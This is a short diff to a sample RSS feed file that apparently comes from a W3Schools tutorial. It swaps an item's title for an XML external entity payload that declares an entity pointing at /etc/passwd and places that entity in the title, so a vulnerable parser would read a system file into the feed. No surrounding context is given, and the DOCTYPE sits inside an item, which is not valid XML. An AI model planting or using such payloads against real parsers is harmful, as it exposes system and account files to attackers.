@@ -6,7 +6,13 @@
   <link>https://www.w3schools.com</link>
   <description>Free web building tutorials</description>
   <item>
-    <title>RSS Tutorial</title>
+    <!DOCTYPE request [
+      <!ENTITY include SYSTEM "/etc/passwd"
+      >
+    ]>
+    <request>
+    <title>&include;</title>
+    </request>
     <link>https://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
